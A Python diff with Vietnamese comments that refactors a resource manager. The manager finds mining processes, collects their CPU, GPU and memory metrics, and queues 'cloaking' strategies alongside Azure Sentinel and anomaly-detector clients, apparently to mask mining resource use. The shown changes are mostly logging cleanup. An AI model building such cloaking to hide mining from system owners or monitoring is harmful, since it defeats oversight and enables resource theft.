@@ -37,12 +37,14 @@ from .auxiliary_modules.power_management import (
 )
 
 ###############################################################################
-#                        HÀM HỖ TRỢ CHIẾM KHÓA (LOCK) W/ TIMEOUT             #
+#                      HÀM HỖ TRỢ CHIẾM KHÓA (LOCK) W/ TIMEOUT               #
 ###############################################################################
-
-
 @asynccontextmanager
 async def acquire_lock_with_timeout(lock, lock_type: str, timeout: float, retries: int = 3):
+    """
+    Hàm hỗ trợ chiếm lock đọc/ghi với thời gian chờ (timeout) + số lần retry.
+    Nếu sau 'retries' lần vẫn không acquire được => yield None.
+    """
     if lock_type == 'read':
         lock_to_acquire = lock.reader_lock
     elif lock_type == 'write':
@@ -73,35 +75,28 @@ async def acquire_lock_with_timeout(lock, lock_type: str, timeout: float, retrie
             except RuntimeError as e:
                 if "Cannot release an un-acquired lock" in str(e):
                     logging.warning(
-                        "Bỏ qua lỗi 'Cannot release an un-acquired lock' do hủy coroutine hoặc race condition cạnh tranh lock."
+                        "Bỏ qua lỗi 'Cannot release an un-acquired lock' do hủy coroutine "
+                        "hoặc race condition cạnh tranh lock."
                     )
                 else:
                     raise
 
 ###############################################################################
-#              LỚP QUẢN LÝ TÀI NGUYÊN DÙNG CHUNG: SharedResourceManager       #
+#              LỚP QUẢN LÝ TÀI NGUYÊN CHUNG: SharedResourceManager            #
 ###############################################################################
 class SharedResourceManager:
-    """
-    Quản lý tài nguyên chung (CPU, RAM, GPU, Disk, Network...).
-    """
-
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
         self.logger = logger
-        # Tăng cường log khi bắt đầu khởi tạo
         self.logger.info("Khởi tạo SharedResourceManager... (BẮT ĐẦU)")
-
         try:
             self.config = config
             self.resource_managers = resource_managers
             self.power_manager = PowerManager()
             self.strategy_cache = {}
 
-            # Log resource_managers nội bộ
             self.logger.debug(f"SharedResourceManager: resource_managers={self.resource_managers}")
 
-            # Khởi tạo NVML
-            self._nvml_init = False  # Trạng thái khởi tạo NVML
+            self._nvml_init = False
             self.logger.debug("SharedResourceManager: Gọi self.initialize_nvml()")
             self.initialize_nvml()
             self.logger.info("SharedResourceManager đã được khởi tạo thành công.")
@@ -112,11 +107,9 @@ class SharedResourceManager:
             self.logger.info("Khởi tạo SharedResourceManager... (KẾT THÚC)")
 
     def is_nvml_initialized(self) -> bool:
-        """Kiểm tra pynvml đã khởi tạo hay chưa."""
         return self._nvml_init
 
     def initialize_nvml(self):
-        """Khởi tạo pynvml (NVML) nếu chưa có."""
         if not self._nvml_init:
             try:
                 pynvml.nvmlInit()
@@ -133,7 +126,6 @@ class SharedResourceManager:
                 raise
 
     async def shutdown_nvml(self):
-        """Đóng NVML khi dừng toàn bộ hệ thống."""
         if self._nvml_init:
             try:
                 pynvml.nvmlShutdown()
@@ -142,12 +134,12 @@ class SharedResourceManager:
             except pynvml.NVMLError as e:
                 self.logger.error(f"Lỗi khi shutdown NVML: {e}")
 
-    ##########################################################################
-    #                     HÀM LẤY THÔNG TIN USAGE (ASYNC)                    #
-    ##########################################################################
+    ###########################################################################
+    #                    HÀM LẤY THÔNG TIN SỬ DỤNG TÀI NGUYÊN (async)         #
+    ###########################################################################
     async def get_process_cache_usage(self, pid: int) -> float:
         """
-        Lấy usage cache của tiến trình từ /proc/[pid]/status (bất đồng bộ).
+        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
         """
         try:
             status_file = f"/proc/{pid}/status"
@@ -170,7 +162,7 @@ class SharedResourceManager:
 
     async def get_gpu_usage_percent(self, pid: int) -> float:
         """
-        Lấy tỉ lệ sử dụng GPU của tiến trình dựa trên PID (bất đồng bộ).
+        Tỷ lệ sử dụng GPU (nvidia) của pid. Gọi hàm đồng bộ `_sync_get_gpu_usage_percent`.
         """
         try:
             loop = asyncio.get_event_loop()
@@ -182,13 +174,9 @@ class SharedResourceManager:
             return 0.0
 
     def _sync_get_gpu_usage_percent(self, pid: int) -> float:
-        """
-        Hàm đồng bộ để lấy GPU usage, được gọi từ async context.
-        Đảm bảo NVMLInit chỉ thực hiện 1 lần, không shutdown ngay tại đây.
-        """
         try:
             if not self.is_nvml_initialized():
-                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init, tiến hành init.")
+                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                 self.initialize_nvml()
 
             if not self._nvml_init:
@@ -207,9 +195,7 @@ class SharedResourceManager:
                         utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                         total_gpu_usage += utilization.gpu
 
-            # Nếu tiến trình có mặt trên GPU => trả về tổng GPU usage
             return total_gpu_usage if gpu_present else 0.0
-
         except pynvml.NVMLError as e:
             self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
             return 0.0
@@ -218,16 +204,12 @@ class SharedResourceManager:
             return 0.0
 
     ##########################################################################
-    #                   ÁP DỤNG VÀ KHÔI PHỤC CHIẾN LƯỢC CLOAKING             #
+    #                    CLOAK / RESTORE CHIẾN LƯỢC TÀI NGUYÊN                #
     ##########################################################################
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
-        """
-        Áp dụng một chiến lược cloaking cho tiến trình.
-        """
         try:
             pid = process.pid
             name = process.name
-
             self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
@@ -235,7 +217,6 @@ class SharedResourceManager:
                 self.logger,
                 self.resource_managers
             )
-
             if not strategy or not callable(getattr(strategy, 'apply', None)):
                 self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                 return
@@ -243,20 +224,19 @@ class SharedResourceManager:
             self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
             strategy.apply(process)
             self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
-
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
             self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi không xác định khi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
     async def restore_resources(self, process: MiningProcess):
         """
-        Khôi phục tài nguyên cho tiến trình đã cloaked.
+        Khôi phục tài nguyên (CPU, GPU...) cho tiến trình đã cloaked.
         """
         try:
             pid = process.pid
@@ -264,7 +244,7 @@ class SharedResourceManager:
             restored = False
 
             for controller_name, manager in self.resource_managers.items():
-                success = await manager.restore_resources(pid)  # Trực tiếp await phương thức async
+                success = await manager.restore_resources(pid)
                 if success:
                     self.logger.info(f"Đã khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
                     restored = True
@@ -272,28 +252,23 @@ class SharedResourceManager:
                     self.logger.error(f"Không thể khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
 
             if restored:
-                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
+                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID={pid}).")
             else:
                 self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID={pid}).")
-
         except psutil.NoSuchProcess:
             self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
         except psutil.AccessDenied:
             self.logger.error(f"Không đủ quyền khôi phục tài nguyên cho PID={process.pid}.")
         except Exception as e:
-            self.logger.error(
-                f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
-            )
+            self.logger.error(f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}")
             raise
 
 ###############################################################################
-#                  LỚP ResourceManager (SINGLETON) CHÍNH                      #
+#                  LỚP ResourceManager (SINGLETON)                            #
 ###############################################################################
 class ResourceManager(IResourceManager):
     """
-    Lớp quản lý tài nguyên hệ thống, giám sát và điều chỉnh tài nguyên
-    cho các tiến trình khai thác (CPU, RAM, GPU, Disk, Network...).
-    Áp dụng mô hình event-driven (watcher).
+    Quản lý tài nguyên hệ thống (CPU, RAM, GPU, Network...), watchers event-driven.
     """
 
     _instance = None
@@ -305,148 +280,108 @@ class ResourceManager(IResourceManager):
         return cls._instance
 
     def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
-        # Thêm check để tránh init nhiều lần
         if hasattr(self, '_initialized') and self._initialized:
             return
 
         self._initialized = True
         self.logger = logger
+        self.config = config
+        self.event_bus = event_bus
+        self.stop_event = asyncio.Event()
 
-        # Logging chi tiết khi bắt đầu init
+        self.resource_lock = aiorwlock.RWLock()
+        self.resource_adjustment_queue = AsyncQueue()
+
+        self.mining_processes: List[MiningProcess] = []
+        self.mining_processes_lock = aiorwlock.RWLock()
+
+        self._counter = count()
+        self.watchers = []
+
+        self.shared_resource_manager: Optional[SharedResourceManager] = None
+
         self.logger.info("ResourceManager.__init__ (BẮT ĐẦU)")
-
         try:
-            self.config = config
-            self.event_bus = event_bus
-
-            # Biến dừng
-            self.stop_event = asyncio.Event()
-
-            # Lock và queue cho sự kiện cloaking/restoration
-            self.resource_lock = aiorwlock.RWLock()
-            self.resource_adjustment_queue = AsyncQueue()
-
-            # Danh sách tiến trình khai thác
-            self.mining_processes: List[MiningProcess] = []
-            self.mining_processes_lock = aiorwlock.RWLock()
-
-            # Dùng để sắp xếp thứ tự ưu tiên
-            self._counter = count()
-            self.watchers = []
-
-            # Đặt trạng thái khởi tạo của SharedResourceManager thành None
-            self.shared_resource_manager: Optional[SharedResourceManager] = None
-
-            self.logger.debug("ResourceManager.__init__: Đăng ký lắng nghe sự kiện 'resource_adjustment'")
             self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
-
             self.logger.info("ResourceManager.__init__ (KẾT THÚC)")
         except Exception as e:
             self.logger.error(f"Lỗi trong ResourceManager.__init__: {e}\n{traceback.format_exc()}")
             raise RuntimeError("Không thể khởi tạo ResourceManager.") from e
 
     async def start(self):
-        """
-        Khởi động ResourceManager.
-        """
         self.logger.info("ResourceManager.start() - BẮT ĐẦU")
         try:
-            # Tăng cường log chi tiết
-            self.logger.info("ResourceManager.start() - Tạo resource_managers từ ResourceControlFactory...")
+            self.logger.info("Tạo resource_managers từ ResourceControlFactory...")
             resource_managers = await ResourceControlFactory.create_resource_managers(
                 config=self.config,
                 logger=self.logger
             )
-            self.logger.debug(f"ResourceControlFactory.create_resource_managers trả về: {resource_managers}")
-
-            self.logger.info("ResourceManager.start() - Đã gọi create_resource_managers xong.")
 
             if not resource_managers:
-                self.logger.error("Không thể tạo ResourceControlFactory managers (trả về None hoặc rỗng).")
-                raise RuntimeError("Không thể tạo ResourceControlFactory managers (trả về None hoặc rỗng).")
+                raise RuntimeError("Không thể tạo ResourceControlFactory managers (None hoặc rỗng).")
 
-            self.logger.info("ResourceManager.start() - Khởi tạo SharedResourceManager...")
+            self.logger.info("Khởi tạo SharedResourceManager...")
             self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
-            if self.shared_resource_manager is None:
-                self.logger.error("SharedResourceManager không được khởi tạo.")
+            if not self.shared_resource_manager:
                 raise RuntimeError("SharedResourceManager không được khởi tạo.")
-            self.logger.info("ResourceManager.start() - Đã khởi tạo SharedResourceManager xong.")
 
-            self.logger.info("ResourceManager.start() - Gọi initialize_azure_clients()...")
+            self.logger.info("Gọi initialize_azure_clients()...")
             self.initialize_azure_clients()
-            self.logger.info("ResourceManager.start() - Đã initialize_azure_clients xong.")
 
-            self.logger.info("ResourceManager.start() - Khám phá tài nguyên Azure...")
+            self.logger.info("Khám phá tài nguyên Azure...")
             self.discover_azure_resources()
-            self.logger.info("ResourceManager.start() - Đã khám phá tài nguyên Azure xong.")
 
-            self.logger.info("ResourceManager.start() - Bắt đầu khởi tạo watchers...")
+            self.logger.info("Bắt đầu khởi tạo watchers...")
             await self.start_watchers()
-            self.logger.info("ResourceManager.start() - Hoàn tất khởi tạo watchers.")
 
             self.logger.info("ResourceManager đã khởi động thành công.")
             self.logger.info("ResourceManager.start() - KẾT THÚC")
-
         except Exception as e:
             self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
-            await self.shutdown()  # shutdown nếu lỗi
+            await self.shutdown()
             raise
 
     def initialize_azure_clients(self):
-        """Khởi tạo các client tương tác với Azure."""
         self.logger.debug("ResourceManager.initialize_azure_clients: Bắt đầu tạo Azure Clients.")
-        try:
-            # Khởi tạo các client Azure với cấu hình đã chuyển đổi thành dict
-            self.azure_sentinel_client = AzureSentinelClient(self.logger)
-            self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
-            self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
-
-            # Chuyển self.config thành dict trước khi truyền vào client
-            self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config.to_dict())
-
-            self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")
-        except Exception as e:
-            self.logger.error(f"Lỗi khi khởi tạo Azure Clients: {e}\n{traceback.format_exc()}")
-            raise
+        self.azure_sentinel_client = AzureSentinelClient(self.logger)
+        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
+        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
+        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config.to_dict())
+        self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")
 
     def discover_azure_resources(self):
-        """Khám phá tài nguyên Azure (Network Watchers, NSGs...)."""
         try:
-            self.logger.debug("ResourceManager.discover_azure_resources: Khám phá Network Watchers.")
-            self.network_watchers = self.azure_network_watcher_client.discover_resources(
-                'Microsoft.Network/networkWatchers'
-            )
-            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")
+            net_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
+            self.network_watchers = net_watchers
+            self.logger.info(f"Khám phá {len(net_watchers)} Network Watchers.")
 
-            self.logger.debug("ResourceManager.discover_azure_resources: Khám phá NSGs.")
-            self.nsgs = self.azure_network_watcher_client.discover_resources(
-                'Microsoft.Network/networkSecurityGroups'
-            )
-            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")
+            nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
+            self.nsgs = nsgs
+            self.logger.info(f"Khám phá {len(nsgs)} NSGs.")
 
-            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ (nếu có).")
+            self.logger.info("Khám phá Traffic Analytics Workspaces (nếu có).")
         except Exception as e:
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
 
     async def is_gpu_initialized(self) -> bool:
-        """Kiểm tra NVML đã được khởi tạo hay chưa."""
         if self.shared_resource_manager:
             return self.shared_resource_manager.is_nvml_initialized()
         return False
 
     async def restore_resources(self, process: MiningProcess) -> bool:
-        """Triển khai phương thức từ IResourceManager, gọi SharedResourceManager."""
         try:
-            await self.shared_resource_manager.restore_resources(process)
-            return True
+            if self.shared_resource_manager:
+                await self.shared_resource_manager.restore_resources(process)
+                return True
+            return False
         except Exception as e:
-            self.logger.error(f"Lỗi trong restore_resources PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi restore_resources PID={process.pid}: {e}\n{traceback.format_exc()}")
             return False
 
+    # ============= watchers / concurrency =============
     async def discover_mining_processes_async(self):
         """
-        Tìm các tiến trình khai thác dựa trên config CPU/GPU,
-        lưu vào self.mining_processes.
+        Tìm tiến trình CPU/GPU => self.mining_processes.
         """
         try:
             cpu_name = self.config.processes.get('CPU', '').lower()
@@ -454,7 +389,7 @@ class ResourceManager(IResourceManager):
 
             async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                 if write_lock is None:
-                    self.logger.error("Timeout khi acquire lock để discover mining processes.")
+                    self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                     return
 
                 self.mining_processes.clear()
@@ -464,205 +399,166 @@ class ResourceManager(IResourceManager):
                         if cpu_name in pname or gpu_name in pname:
                             prio = self.get_process_priority(proc.info['name'])
                             net_if = self.config.network_interface
-                            mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
-                            self.mining_processes.append(mining_proc)
-                            self.logger.debug(f"Discovered mining process: {mining_proc}")
+                            mproc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
+                            self.mining_processes.append(mproc)
+                            self.logger.debug(f"Discovered mining process: {mproc}")
                     except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                         continue
                 self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
-
         except Exception as e:
             self.logger.error(f"Lỗi discover_mining_processes_async: {e}\n{traceback.format_exc()}")
 
     def get_process_priority(self, process_name: str) -> int:
-        """
-        Lấy độ ưu tiên (priority) dựa trên config.
-        """
         priority_map = self.config.process_priority_map
         pri_val = priority_map.get(process_name.lower(), 1)
         if not isinstance(pri_val, int):
-            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán = 1.")
+            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
             return 1
         return pri_val
 
-    ##########################################################################
-    #         PHƯƠNG THỨC MỚI: collect_metrics và collect_all_metrics         #
-    ##########################################################################
-
     async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
         """
-        Thu thập metric cho 1 tiến trình => trả về dict 
-        với các key đồng nhất với logic anomaly (VD: 'cpu_usage', 'gpu_usage', 'cache_usage', 'network_usage', 'memory_usage').
+        Thu thập metric => { 'cpu_usage':..., 'gpu_usage':..., 'cache_usage':..., 'network_usage', 'memory_usage' }.
         """
         try:
             if not psutil.pid_exists(process.pid):
                 self.logger.warning(f"PID={process.pid} không tồn tại.")
                 return {}
+            proc_obj = psutil.Process(process.pid)
+            cpu_pct = proc_obj.cpu_percent(interval=1)
+            mem_mb = proc_obj.memory_info().rss / (1024**2)
 
-            p_obj = psutil.Process(process.pid)
-
-            # Lấy CPU usage (%)
-            cpu_pct = p_obj.cpu_percent(interval=1)
-            # Lấy RAM usage (MB)
-            mem_mb = p_obj.memory_info().rss / (1024**2)
-
-            # GPU usage (%)
             gpu_pct = 0.0
             if await self.is_gpu_initialized():
                 gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)
 
-            # Disk I/O => coi là network_usage hay disk_usage? Tùy
-            # Ở đây ta giả sử "network_usage" chính là 'disk_io_mbps' (hoặc rename):
             disk_mbps = await temperature_monitor.get_current_disk_io_limit(process.pid)
-
-            # Cache usage
             cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid)
 
-            # => SỬA KEY cho đồng nhất
             metrics = {
-                'cpu_usage': float(cpu_pct),         # thay vì cpu_usage_percent
-                'memory_usage': float(mem_mb),       # thay vì memory_usage_mb
-                'gpu_usage': float(gpu_pct),         # thay vì gpu_usage_percent
-                'network_usage': float(disk_mbps),   # thay vì disk_io_mbps
-                'cache_usage': float(cache_l),       # thay vì cache_limit_percent
+                'cpu_usage': float(cpu_pct),
+                'memory_usage': float(mem_mb),
+                'gpu_usage': float(gpu_pct),
+                'network_usage': float(disk_mbps),
+                'cache_usage': float(cache_l),
             }
-
             self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
             return metrics
-
         except Exception as e:
             self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}")
             return {}
 
     async def collect_all_metrics(self) -> Dict[str, Any]:
         """
-        Thu thập metrics cho tất cả tiến trình khai thác.
-        Kết quả: { 'pid': { 'cpu_usage':..., 'gpu_usage':..., ...}, ... }
+        Thu thập metrics cho TẤT CẢ mining_processes => { pid: {...}, ... }.
         """
         metrics_data = {}
         try:
-            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
-                if write_lock is None:
-                    self.logger.error("Timeout khi acquire lock để collect_all_metrics.")
+            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as lock_ctx:
+                if lock_ctx is None:
+                    self.logger.error("Timeout lock collect_all_metrics.")
                     return metrics_data
 
-                tasks = [self.collect_metrics(proc) for proc in self.mining_processes]
+                tasks = [self.collect_metrics(p) for p in self.mining_processes]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
-
-                for proc, result in zip(self.mining_processes, results):
-                    if isinstance(result, Exception):
-                        self.logger.error(f"Lỗi khi thu thập metrics cho PID={proc.pid}: {result}")
-                    elif isinstance(result, dict) and result:
-                        metrics_data[str(proc.pid)] = result
+                for proc, res in zip(self.mining_processes, results):
+                    if isinstance(res, Exception):
+                        self.logger.error(f"Lỗi collect metrics PID={proc.pid}: {res}")
+                    elif isinstance(res, dict) and res:
+                        metrics_data[str(proc.pid)] = res
                     else:
                         self.logger.warning(f"Không có metrics hợp lệ cho PID={proc.pid}")
-
                 self.logger.debug(f"Dữ liệu metrics đã thu thập: {metrics_data}")
-
         except Exception as e:
             self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
         return metrics_data
 
-    ##########################################################################
-    #                         HÀNG ĐỢI SỰ KIỆN CLOAK/RESTORE                 #
-    ##########################################################################
     async def handle_resource_adjustment(self, task: Dict[str, Any]):
-        """
-        Xử lý các sự kiện điều chỉnh tài nguyên từ EventBus.
-        """
+        """ Nhận event 'resource_adjustment' => put vào queue. """
         try:
             await self.resource_adjustment_queue.put(task)
             self.logger.info(
-                f"Đã nhận sự kiện điều chỉnh tài nguyên: {task['type']} "
-                f"cho PID={task.get('process').pid if 'process' in task else 'N/A'}"
+                f"Đã nhận sự kiện: {task['type']} cho PID={task.get('process').pid if 'process' in task else 'N/A'}"
             )
         except Exception as e:
-            self.logger.error(f"Lỗi khi handle_resource_adjustment: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi handle_resource_adjustment: {e}\n{traceback.format_exc()}")
 
     async def enqueue_cloaking(self, process: MiningProcess):
-        """Thêm vào queue để cloaking."""
+        """ Yêu cầu cloak => add task vào resource_adjustment_queue. """
         try:
             task = {
                 'type': 'cloaking',
                 'process': process,
                 'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']
             }
-            # Cloaking ưu tiên cao (priority=1)
             priority = 1
             count_val = next(self._counter)
             await self.resource_adjustment_queue.put((priority, count_val, task))
-            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
+            self.logger.info(f"Đã enqueue cloaking cho PID={process.pid}.")
         except Exception as e:
             self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     async def enqueue_restoration(self, process: MiningProcess):
-        """Thêm vào queue để khôi phục."""
+        """ Yêu cầu restore => add task vào resource_adjustment_queue. """
         try:
             task = {
                 'type': 'restoration',
                 'process': process
             }
-            # Restoration ưu tiên thấp hơn (priority=2)
             priority = 2
             count_val = next(self._counter)
             await self.resource_adjustment_queue.put((priority, count_val, task))
-            self.logger.info(f"Đã enqueue khôi phục tài nguyên cho {process.name} (PID={process.pid}).")
+            self.logger.info(f"Đã enqueue khôi phục cho PID={process.pid}.")
         except Exception as e:
-            self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Không thể enqueue restoration PID={process.pid}: {e}\n{traceback.format_exc()}")
 
-    ##########################################################################
-    #                           PHÁT HIỆN BẤT THƯỜNG                          #
-    ##########################################################################
     async def process_resource_adjustments(self):
         """
-        Coroutine xử lý sự kiện cloaking/restoration từ resource_adjustment_queue.
+        Worker loop => dequeue => apply cloaking / restoration strategies.
         """
         while not self.stop_event.is_set():
             try:
-                priority, count_val, task = await asyncio.wait_for(
-                    self.resource_adjustment_queue.get(),
-                    timeout=1
-                )
+                priority, count_val, task = await asyncio.wait_for(self.resource_adjustment_queue.get(), timeout=1)
                 if task['type'] == 'cloaking':
-                    for strategy in task['strategies']:
-                        if strategy not in self.shared_resource_manager.strategy_cache:
-                            strategy_instance = CloakStrategyFactory.create_strategy(
-                                strategy,
-                                self.config,
-                                self.logger,
+                    # Cloaking => apply each strategy
+                    for strat in task['strategies']:
+                        if strat not in self.shared_resource_manager.strategy_cache:
+                            strat_inst = CloakStrategyFactory.create_strategy(
+                                strat, self.config, self.logger,
                                 self.shared_resource_manager.resource_managers
                             )
-                            self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
-                            self.logger.debug(f"Created and cached strategy '{strategy}'.")
+                            self.shared_resource_manager.strategy_cache[strat] = strat_inst
+                            self.logger.debug(f"Created strategy '{strat}'.")
                         else:
-                            strategy_instance = self.shared_resource_manager.strategy_cache[strategy]
-                            self.logger.debug(f"Retrieved cached strategy '{strategy}'.")
+                            strat_inst = self.shared_resource_manager.strategy_cache[strat]
 
-                        if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
-                            self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}.")
-                            strategy_instance.apply(task['process'])
-                            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}.")
+                        if strat_inst and callable(getattr(strat_inst, 'apply', None)):
+                            self.logger.info(f"Áp dụng '{strat}' cho PID={task['process'].pid}.")
+                            strat_inst.apply(task['process'])
+                            self.logger.info(f"Áp dụng xong '{strat}' cho PID={task['process'].pid}.")
                         else:
-                            self.logger.error(f"Không thể áp dụng strategy '{strategy}' cho PID={task['process'].pid}.")
+                            self.logger.error(f"Không thể áp dụng strategy '{strat}' cho PID={task['process'].pid}.")
 
                 elif task['type'] == 'restoration':
+                    # Restore => shared_resource_manager.restore_resources
                     self.logger.info(f"Đang khôi phục tài nguyên cho PID={task['process'].pid}.")
                     await self.shared_resource_manager.restore_resources(task['process'])
-                    self.logger.info(f"Đã khôi phục tài nguyên cho PID={task['process'].pid}.")
+                    self.logger.info(f"Đã khôi phục cho PID={task['process'].pid}.")
 
                 self.resource_adjustment_queue.task_done()
 
             except asyncio.TimeoutError:
-                continue  # Nếu queue trống, chờ 1 giây rồi lặp
+                # Queue empty => chờ 1 giây
+                continue
             except Exception as e:
-                self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")
+                self.logger.error(f"Lỗi process_resource_adjustments: {e}\n{traceback.format_exc()}")
 
     ##########################################################################
-    #                          WATCHERS: GIÁM SÁT NHIỆT ĐỘ, CÔNG SUẤT         #
+    #                    WATCHERS: NHIỆT ĐỘ, CÔNG SUẤT, ETC.                 #
     ##########################################################################
     async def temperature_watcher(self):
         """
-        Watcher giám sát nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloaking.
+        Giám sát nhiệt độ CPU/GPU => nếu vượt => enqueue_cloaking.
         """
         mon_params = self.config.monitoring_parameters
         temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
@@ -670,59 +566,56 @@ class ResourceManager(IResourceManager):
         cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
         gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)
 
-        retry_delay = 1  # Độ trễ ban đầu khi retry
+        retry_delay = 1
         while not self.stop_event.is_set():
             try:
+                # Lấy lock => discover process
                 await self.discover_mining_processes_async()
 
+                # lock read => check temperature
                 async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                     if read_lock is None:
-                        self.logger.warning("Timeout khi lock mining_processes trong temperature_watcher.")
-                        retry_delay = min(retry_delay * 2, 60)  # Tăng dần độ trễ, tối đa 60 giây
+                        self.logger.warning("Timeout lock => temperature_watcher.")
+                        retry_delay = min(retry_delay * 2, 60)
                         await asyncio.sleep(retry_delay)
                         continue
 
-                    tasks = [
-                        self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)
-                        for proc in self.mining_processes
-                    ]
+                    tasks = [self.check_temperature_and_enqueue(p, cpu_max_temp, gpu_max_temp)
+                             for p in self.mining_processes]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
-                    for result in results:
-                        if isinstance(result, Exception):
-                            self.logger.error(f"Lỗi trong task check_temperature_and_enqueue: {result}")
+                    for r in results:
+                        if isinstance(r, Exception):
+                            self.logger.error(f"Lỗi check_temperature_and_enqueue: {r}")
 
-                    retry_delay = 1  # Reset độ trễ nếu thành công
-
+                    retry_delay = 1
             except asyncio.CancelledError:
                 self.logger.info("Watcher bị hủy (temperature_watcher).")
                 break
             except Exception as e:
-                self.logger.error(f"Lỗi trong temperature_watcher: {e}\n{traceback.format_exc()}")
+                self.logger.error(f"Lỗi temperature_watcher: {e}\n{traceback.format_exc()}")
+
             await asyncio.sleep(temp_intv)
 
     async def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
         try:
             cpu_temp = await temperature_monitor.get_cpu_temperature()
-            gpu_temps = await temperature_monitor.get_gpu_temperature() if await self.is_gpu_initialized() else []
-
-            # Kiểm tra kiểu và chuyển đổi nếu cần
-            if not isinstance(gpu_temps, (list, tuple)):
-                gpu_temps = [gpu_temps]
+            g_temps = await temperature_monitor.get_gpu_temperature() if await self.is_gpu_initialized() else []
+            if not isinstance(g_temps, (list, tuple)):
+                g_temps = [g_temps]
 
             if cpu_temp > cpu_max_temp:
                 self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid}).")
                 await self.enqueue_cloaking(process)
 
-            if any(temp > gpu_max_temp for temp in gpu_temps):
